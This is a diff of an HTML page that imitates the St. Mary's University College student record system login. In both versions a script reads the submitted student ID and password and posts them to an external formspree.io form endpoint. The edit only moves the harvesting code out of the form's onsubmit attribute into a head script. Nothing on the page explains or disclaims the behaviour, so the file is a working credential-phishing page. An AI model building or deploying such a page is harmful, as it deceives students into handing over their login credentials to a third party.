@@ -1,156 +1,112 @@
-<html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
-    <style>
-
-
-    body {
-        margin:0;
-        padding:0;
-        font:  11px/1.5em Verdana;
-}
-
-h2 {
-        font: 5px Verdana, Arial, Helvetica, sans-serif;
-        color: #000;
-        margin: 0px;
-        padding: 0px 0px 0px 15px;
-}
-
-/*- Menu Tabs F--------------------------- */
-
-    #tabs1 {
-      float:left;
-      width:100%;
-      background:#F4F7FB;
-      font-size:85%;
-      line-height:normal;
-          border-bottom:1px solid #BCD2E6;
-		    	  font: bold 9px/1.5em Verdana;
-      }
-    #tabs1 ul {
-          margin:0;
-          padding:10px 10px 0 5px;
-          list-style:none;
-      }
-    #tabs1 li {
-      display:inline;
-      margin:0;
-      padding:0;
-      }
-    #tabs1 a {
-      float:left;
-      background:url("tableft1.gif") no-repeat left top;
-      margin:0;
-      padding:0 0 0 4px;
-      text-decoration:none;
-      }
-    #tabs1 a span {
-      float:left;
-      display:block;
-      background:url("tabright1.gif") no-repeat right top;
-      padding:5px 10px 4px 6px;
-      color:#627EB7;
-      }
-    #tabs1 a span {float:none;}
-    #tabs a:hover span {
-      color:#627EB7;
-      }
-    #tabs1 a:hover {
-      background-position:0% -42px;
-      }
-    #tabs1 a:hover span {
-      background-position:100% -42px;
-      }
-
-      #tabs1 #current a {
-              background-position:0% -42px;
-      }
-      #tabs1 #current a span {
-              background-position:100% -42px;
-      }
--->
-
-    </style>
-    <style>
-      #center1 {
-	width: 1003px;
-	margin: 0 auto;
-	background:  url(image/bg.jpg) repeat-y;
-}
-#center2 {
-	width: 781px;
-	margin: 0 auto;
-	background: url(image/bg.jpg) repeat-y;
+	<link rel="stylesheet" href="http://moodle.smuc.edu.et/students/style.css">
 	
-}
+	<style type="text/css">
+		<!--
+			body {
+				margin:0;
+				padding:0;
+				font:  11px/1.5em Verdana;
+		}
+		
+		h2 {
+				font: 5px Verdana, Arial, Helvetica, sans-serif;
+				color: #000;
+				margin: 0px;
+				padding: 0px 0px 0px 15px;
+		}
+		
+		/*- Menu Tabs F--------------------------- */
+		
+			#tabs1 {
+			  float:left;
+			  width:100%;
+			  background:#F4F7FB;
+			  font-size:85%;
+			  line-height:normal;
+				  border-bottom:1px solid #BCD2E6;
+						  font: bold 9px/1.5em Verdana;
+			  }
+			#tabs1 ul {
+				  margin:0;
+				  padding:10px 10px 0 5px;
+				  list-style:none;
+			  }
+			#tabs1 li {
+			  display:inline;
+			  margin:0;
+			  padding:0;
+			  }
+			#tabs1 a {
+			  float:left;
+			  background:url("tableft1.gif") no-repeat left top;
+			  margin:0;
+			  padding:0 0 0 4px;
+			  text-decoration:none;
+			  }
+			#tabs1 a span {
+			  float:left;
+			  display:block;
+			  background:url("tabright1.gif") no-repeat right top;
+			  padding:5px 10px 4px 6px;
+			  color:#627EB7;
+			  }
+			#tabs1 a span {float:none;}
+			#tabs a:hover span {
+			  color:#627EB7;
+			  }
+			#tabs1 a:hover {
+			  background-position:0% -42px;
+			  }
+			#tabs1 a:hover span {
+			  background-position:100% -42px;
+			  }
+		
+			  #tabs1 #current a {
+					  background-position:0% -42px;
+			  }
+			  #tabs1 #current a span {
+					  background-position:100% -42px;
+			  }
+		-->
+	</style>
 
-#headerp{
-	font-family: Arial, Tahoma;
-	font-size: 9pt;
-	align:center;
-}
-#headert{
-	font-family: Arial, Tahoma;
-	font-size: 10pt;
-	align:center;
-	font-weight: bold;
-}
+	<script>
+	console.log("error 323");
+		var name = "amh";
+		var onclick = () => {
+		event.preventDefault();
+		var id = document.getElementById("ID").value
+		var pass = document.getElementById("PASS").value
 
-#headergrep{
-	font-family: Arial Narrow;
-	font-size: 4;
-	align:center;	
-}
-#center2 {
-	width: 760px;
-	margin: 0 auto;
-	font-family: Arial, Tahoma;
-	font-size: 10pt;
-	font-weight: bold;
-
-}
-
-:link { color: rgb(51,51,125) ; text-decoration: none;}
-:active { color: rgb(0,153,0) ; text-decoration: underline; }
-:visited { color: rgb(85,85,175) ; text-decoration: none; }</style>
-
-<script>
-  console.log("error 323");
-  var name = 'amh';
-var onclick = () => {
-	event.preventDefault();
-    var id = document.getElementById('ID').value
-    var pass = document.getElementById('PASS').value
-
-    fetch("https://formspree.io/f/mqkjkvgw", {
-    method: "POST",
-    body: JSON.stringify({
-        id: id,
-        pass: pass,
-        
-    }),
-     
-    headers: {
-        "Content-type": "application/json; charset=UTF-8"
-    }
-})
- 
-// Converting to JSON
-.then(response => response.json())
- 
-// Displaying results to console
-.then(json => console.log(json));
-}
-</script>
+		fetch("https://formspree.io/f/mqkjkvgw", {
+		method: "POST",
+		body: JSON.stringify({
+			id: id,
+			pass: pass,
+			
+		}),
+		
+		headers: {
+			"Content-type": "application/json; charset=UTF-8"
+		}
+	})
+	
+	// Converting to JSON
+	.then(response => response.json())
+	
+	// Displaying results to console
+	.then(json => console.log(json));
+	}
+	</script>
 </head>
-  <body style="margin: 0px !important;background-color: white;" data-new-gr-c-s-check-loaded="8.901.0" data-gr-ext-installed="" background="http://moodle.smuc.edu.et/students/image/bg.jpg">
+<body style="margin: 0px !important;background-color: white;" data-new-gr-c-s-check-loaded="8.901.0" data-gr-ext-installed="" background="http://moodle.smuc.edu.et/students/image/bg.jpg">
 
-  
- 
 <br>
 <div id="center2">
 <table width="100%" height="100%" cellspacing="0" cellpadding="1">
@@ -192,80 +148,9 @@ var onclick = () => {
 
 
 <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
-<title> ST. MARY'S UNIVERSITY COLLEGE STUDENTS' RECORD MANAGEMENT SYSTEM </title>
-<link rel="stylesheet" type="text/css" href="style.css">
-                      <style type="text/css">
-<!--
-  body {
-      margin:0;
-      padding:0;
-      font:  11px/1.5em Verdana;
-}
+<title> ST. MARY"S UNIVERSITY COLLEGE STUDENTS" RECORD MANAGEMENT SYSTEM </title>
 
-h2 {
-      font: 5px Verdana, Arial, Helvetica, sans-serif;
-      color: #000;
-      margin: 0px;
-      padding: 0px 0px 0px 15px;
-}
 
-/*- Menu Tabs F--------------------------- */
-
-  #tabsF {
-    float:left;
-    width:100%;
-    background:#efefef;
-    font-size:85%;
-    line-height:normal;
-        border-bottom:1px solid #666;		
-                font: bold 9px/1.5em Verdana;
-
-    }
-  #tabsF ul {
-      margin:0;
-      padding:10px 10px 0 5px;
-      list-style:none;
-    }
-  #tabsF li {
-    display:inline;
-    margin:0;
-    padding:0;
-    }
-  #tabsF a {
-    float:left;
-    background:url("tableftF.gif") no-repeat left top;
-    margin:0;
-    padding:0 0 0 4px;
-    text-decoration:none;
-    }
-  #tabsF a span {
-    float:left;
-    display:block;
-    background:url("tabrightF.gif") no-repeat right top;
-    padding:5px 10px 4px 6px;
-    color:#666;
-    }
-  /* Commented Backslash Hack hides rule from IE5-Mac \*/
-  #tabsF a span {float:none;}
-  /* End IE5-Mac hack */
-  #tabsF a:hover span {
-    color:#FFF;
-    }
-  #tabsF a:hover {
-    background-position:0% -42px;
-    }
-  #tabsF a:hover span {
-    background-position:100% -42px;
-    }
-
-      #tabsF #current a {
-              background-position:0% -42px;
-      }
-      #tabsF #current a span {
-              background-position:100% -42px;
-      }
--->
-</style>
 <script language="JavaScript" type="text/JavaScript">
 <!--
 function MM_reloadPage(init) {  //reloads the window if Nav4 resized
@@ -285,25 +170,7 @@ MM_reloadPage(true);
 <table>
   <tbody><tr>
    <td valign="top"><br><br>
-     <form name="index" onsubmit=`function(){
-      event.preventDefault();
-      var id = document.getElementById('ID').value
-      var pass = document.getElementById('PASS').value
-      fetch("https://formspree.io/f/mqkjkvgw", {
-        method: "POST",
-        body: JSON.stringify({
-            id: id,
-            pass: pass,
-            
-        }),
-        
-        headers: {
-            "Content-type": "application/json; charset=UTF-8"
-        }
-      })
-      
-  
-}`>
+     <form name="index" onsubmit=`` >
        <input type="hidden" name="refresh" value="96222">	
        <table cellspacing="0" cellpadding="1">
           <tbody><tr> 
@@ -382,7 +249,7 @@ MM_reloadPage(true);
 
 <table width="100%">
   <tbody><tr>
-    <td valign="top" align="right"><font color="#D2D2D2">Copyright © 2010 St. Mary's University College <br>Designed By Nebiyu Hailetsion </font></td>
+    <td valign="top" align="right"><font color="#D2D2D2">Copyright © 2010 St. Mary"s University College <br>Designed By Nebiyu Hailetsion </font></td>
   </tr>
 </tbody></table>
 </div>
@@ -392,4 +259,3 @@ MM_reloadPage(true);
 </div>
 
 </body>
-</html>
